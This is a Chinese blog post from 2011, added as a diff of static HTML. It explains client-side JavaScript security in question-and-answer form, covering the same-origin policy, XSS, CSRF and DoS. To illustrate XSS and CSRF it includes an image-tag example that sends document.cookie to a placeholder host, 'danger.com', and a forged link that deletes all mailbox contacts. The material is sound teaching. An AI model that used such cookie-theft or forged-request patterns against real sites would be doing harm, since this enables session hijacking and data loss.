@@ -1,0 +1,314 @@
+
+<!DOCTYPE html>
+<!--[if IE 7 ]>    <html lang="zh-CN" class="ie7"> <![endif]-->
+<!--[if IE 8 ]>    <html lang="zh-CN" class="ie8"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!--> <html lang="zh-CN"> <!--<![endif]-->
+  <head>
+	  <meta charset="utf-8">
+	  <!--[if IE 8 ]><meta http-equiv="X-UA-Compatible" content="IE=7"><![endif]-->
+	  <title>BW客户端js之安全概述篇(三)</title>
+	<meta name="keywords" content="张华宁,javascript,js,security">
+    <meta name="description" content="javascript client security">
+    <meta name="author" content="张华宁">
+
+    <!-- Enable responsive viewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Favicon -->
+	<link rel="shortcut icon" href="/favicon.ico">
+
+    <!-- atom & rss feed -->
+    <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="Sitewide ATOM Feed">
+    <link href="/rss.xml" type="application/rss+xml" rel="alternate" title="Sitewide RSS Feed">
+
+	<!-- Styles 
+	<link rel="stylesheet" href="/assets/themes/twitter/css/style.min.css">
+	<link rel="stylesheet" href="/assets/themes/twitter/css/font-awesome.min.css">
+	-->
+	<!-- le Styles -->
+	<link rel="stylesheet" href="/assets/themes/twitter/bootstrap/css/bootstrap.2.2.2.min.css">
+	<link rel="stylesheet" href="/assets/themes/twitter/css/style.css?body=1">
+
+	<!-- Scripts -->
+	<script type="text/javascript" src="/assets/themes/twitter/js/jquery-1.10.1.min.js"></script>
+
+    <!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+    <!--[if lt IE 9]>
+	<script src="/assets/themes/twitter/js/html5shiv.js"></script>
+    <![endif]-->
+
+  </head>
+
+  <body>
+    <div class="navbar">
+      <div class="navbar-inner">
+        <div class="container-narrow">
+          <a class="brand" href="/">张华宁的笔记本</a>
+          <ul class="nav">
+            
+            
+            
+
+
+  
+    
+      
+      	
+      	<li><a href="/tags.html">Tags</a></li>
+      	
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+      	
+      	<li><a href="/categories.html">Categories</a></li>
+      	
+      
+    
+  
+    
+      
+      	
+      	<li><a href="/pages.html">Pages</a></li>
+      	
+      
+    
+  
+    
+      
+      	
+      	<li><a href="/archive.html">Archive</a></li>
+      	
+      
+    
+  
+
+
+
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <div class="container-narrow">
+
+      <div class="content">
+        
+<div class="page-header">
+  <h1>BW客户端js之安全概述篇(三) </h1>
+</div>
+
+<div class="row-fluid post-full">
+  <div class="span12">
+    <div class="date">
+      <span>15 July 2011</span>
+    </div>
+    <div class="content">
+      <h4 id="whitejs">White:为什么要重视客户端js的安全性？</h4>
+
+<p><em>Black:</em> web浏览器包含js解释器，也就是说一旦载入web页面，就可以让页面上的任意js代码在计算机中执行。</p>
+
+<p>页面中的js代码来自网络，其中有可能包含恶意代码，盗取用户信息、隐私或者破坏用户系统，所以很明显这里存在安全隐患。浏览器厂商强调自己产品的安全性保障，它们在下面两方面博弈：</p>
+
+<ul>
+<li>定义强大的客户端API，启用强大的web应用。</li>
+
+<li>阻止恶意代码读取或修改数据、盗取隐私、诈骗或浪费时间。</li>
+</ul>
+
+<p>浏览器厂商一方面禁止客户端js的一些功能，比如js不能随意读取、写入或删除任意本地文件或目录；客户端js没有任何网络通讯能力；客户端js不能构建服务器，即网络中的浏览器之间无法直接进行通信。</p>
+
+<p>另一方面浏览器厂商对于支持的一些功能施加限制，来加强安全性。</p>
+<hr />
+<h4 id="whitejs_2">White:客户端js有哪些限制？</h4>
+
+<p><em>Black:</em></p>
+
+<ul>
+<li>js程序可以打开一个新窗口，但浏览器限制它只能影响用户单击鼠标等操作触发事件的时候才能使用它。</li>
+
+<li>js可以关闭自己打开的窗口，但不允许它不经用户确认就关闭其他的窗口。</li>
+
+<li>html的fileupload控件的value属性是只读的，意味着它只能是用户主动选择的文件。</li>
+
+<li>js不能读取从不同服务器载入的文档的内容，遵循同源策略。js文件的内容可以跨域访问，利用它构建jsonp技术。</li>
+
+<li>js脚本不能在来自不同服务器的文档上注册事件监听器。防止脚本窃取其他页面用户输入。</li>
+
+<li>XMLHttpRequest只能访问同源的服务器。</li>
+
+<li>js可以打开其他服务器的页面，但不能读取页面上的js脚本和html内容。</li>
+
+<li>cookie的访问遵循同源策略。</li>
+</ul>
+
+<p>后面几条都是基于同源策略作出的安全限制。</p>
+<hr />
+<h4 id="white">White:什么是同源策略？</h4>
+
+<p><em>Black:</em> 同源的意思是url中的协议(http,https)、域名、端口必须相同，并且域名不能是com、net这样的顶级域名。如果包含子域名，则子域名也必须相同。</p>
+
+<p>同源策略是对js代码能够操作哪些web内容的一条完整的安全限制。当web页面使用iframe元素或者打开其他窗口的时候，这一策略通常会发挥作用。此时同源策略负责管理窗口或窗体中js代码和其他窗口间的交互。具体来说，脚本只能读取和所述文档来源相同的窗口和文档的属性。</p>
+
+<p>脚本本身的来源和同源策略不相关，相关的是脚本所在的文档。</p>
+<hr />
+<h4 id="white_2">White:安全的突破同源策略的技术？</h4>
+
+<p><em>Black:</em> 因为同源策略的限制太严格，给现实需求带来一些问题。比如一个大站点包含多个子域，有些信息需要在多个子域间共享。为了支持这种需求，有了如下几种不严格的同源策略解决方式：</p>
+
+<ul>
+<li>可以设置不同子域文档的document的domain属性到其上一级域名。设置的域名只能提升到上级域名，而不能降低或者跳到同级其他域名。</li>
+
+<li>动态script实现，即jsonp技术,可以完全跨域名但是接受请求的一般会严格限制其来源来保证安全性。</li>
+
+<li>利用ifrmae和hash实现，hash可以跨窗口，可以完全跨域名。</li>
+
+<li>利用window.name实现，window.name可以跨窗口，可以完全跨域名。</li>
+
+<li>HTML5提出了跨文档消息(cross-document messaging)，允许来自一个文档的脚本可以传递文本消息到另一个文档的脚本，不考虑其来源。</li>
+</ul>
+<hr />
+<h4 id="whitexss">White:什么是跨站脚本攻击(XSS)？</h4>
+
+<p><em>Black:</em> 跨站脚本(Cross-site script)是攻击者像目标web页面注入html标签和脚本，使得访问这个页面的浏览者受到攻击。</p>
+
+<p>举例说明：页面xss.html中的一部分内容是动态读取其他用户录入的信息，但是某个恶意用户在其中输入了<code>alert(&#39;你被攻击了&#39;)</code>，然后”页面没有进行安全处理把恶意输入记录了”，当其他浏览者访问xss.html页面时，”页面也没有进行安全处理就显示了这些内容”，那么用户就被攻击了。</p>
+
+<p>其实上述两个安全处理都很复杂，涉及到编码等情况让其复杂无比。方案有编码输入输出、设置白名单(黑名单不推荐)、设置安全边界等等。</p>
+<hr />
+<h4 id="whitexss_2">White:电子邮件来说明跨站脚本攻击(XSS)？</h4>
+
+<p><em>Black:</em> 我们知道一般电子邮箱都会默认屏蔽图片的显示，我就来说一下为什么要这么做。电子邮箱的内容是支持html的，那么其内容也就可能是带有js代码和html元素。比如一张图片其<code>src = &#39; h t t p://danger.com/getcookie/xss.jpg?msg = document.cookie&#39;</code>。这里我随便写的只是为了举例说明原理，没有测试过。</p>
+
+<p>当你显示这张图片的时候，浏览器会访问src指向的地址来获取图片，这时候你肯定是登录了邮箱，所以后面的’document.cookie’会把你电子邮箱的身份信息发送到danger.com，它通过一段代码把你的信息记录下来，这些信息可能包含你的银行卡号、电话号码、密码等等（这要看你使用的电子邮件服务商的安全性）。这样恶意用户就得到了你的很多信息了，可以用来做很多危害你的事情。比如CSRF。</p>
+<hr />
+<h4 id="whitecsrf">White:什么是跨站请求伪造攻击(CSRF)？</h4>
+
+<p><em>Black:</em> 跨站请求伪造（Cross-site request forgery）是攻击者盗用了你的身份，以你的名义发送恶意请求，执行了你不知道的操作。</p>
+
+<p>上面恶意用户知道了你的很多信息，又给你一封恶意邮件，上面包含一个删除你通讯录所有电邮地址的链接，这个链接被伪装为”点击我得500W”、”点击看美女”等非常诱惑的信息，其实它的链接是这样<code>href=&#39;h t t p://yourmail.com/api/operate=deleteallcontacter&#39;</code>这样的，你点击之后你的联系人统统不见了。</p>
+<hr />
+<h4 id="whitedos">White:什么是拒绝服务攻击(DOS)？</h4>
+
+<p><em>Black:</em> 这个以前经常见，你打开一个网页，不停弹出提示让你确定，却永远确定不完，也不能关闭窗口，就属于这样的攻击。就是让你不能使用。不过现在这样的几乎不见了，浏览器帮你处理掉这样的恶意代码了。</p>
+
+<p>但是有些比较隐晦使用window.setInterval()这样的方法来占用你的cpu，也能达到拒绝服务攻击的效果。</p>
+
+<p>DOS通常来指的是攻击服务器，只要攻击来源足够多，没有一劳永逸的办法防御，只能通过延长请求间隔、封锁ip、防机器人验证等方式来减缓攻击造成的危害。</p>
+<hr />
+    </div>
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-folder-open"></i></li>
+      
+      
+
+
+  
+     
+    	<li><a href="/categories.html#books-ref">
+    		books <span>19</span>
+    	</a></li>
+    
+  
+
+
+    </ul>
+    
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-tags"></i></li>
+      
+      
+
+
+  
+     
+    	<li><a href="/tags.html#javascript-ref">javascript <span>19</span></a></li>
+     
+    	<li><a href="/tags.html#web-ref">web <span>19</span></a></li>
+    
+  
+
+
+
+    </ul>
+    
+
+    <hr>
+    <div class="pagination">
+      <ul>
+      
+        <li class="prev"><a href="/books/2011/07/10/jsdg-chap13-jsthread.html" title="BW客户端js之线程篇(二)">&larr; Previous</a></li>
+      
+        <li><a href="/archive.html">Archive</a></li>
+      
+        <li class="next"><a href="/books/2011/07/20/jsdg-chap14-window.html" title="BW客户端js之window对象(四)">Next &rarr;</a></li>
+      
+      </ul>
+    </div>
+    <hr>
+    
+
+
+  <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_developer = 1;
+    var disqus_shortname = 'izhanghuaning'; // required: replace example with your forum shortname
+    
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+
+
+  </div>
+</div>
+
+
+      </div>
+	  <hr>
+      <footer>
+        <p>&copy;2011-2014 张华宁
+          基于 <a href="http://jekyllbootstrap.com" target="_blank" title="The Definitive Jekyll Blogging Framework">Jekyll Bootstrap</a>
+          和 <a href="http://twitter.github.com/bootstrap/" target="_blank">Twitter Bootstrap</a> 搭建,
+		  <em><strong>本博客的很多想法来自于其他优秀博客作者，时隔久远不能给出每个链接了，如果原作者觉得被冒犯，请留言或联系我（izhanghuaning$163.com），我会及时进行处理，衷心感谢你们，本博客内容和源代码遵循<a href="http://opensource.org/licenses/mit-license.php" target="_blank">MIT开源协议</a>,转载请注明出处，谢谢。</strong></em>
+        </p>
+      </footer>
+
+    </div>
+
+    
+  </body>
+</html>
+
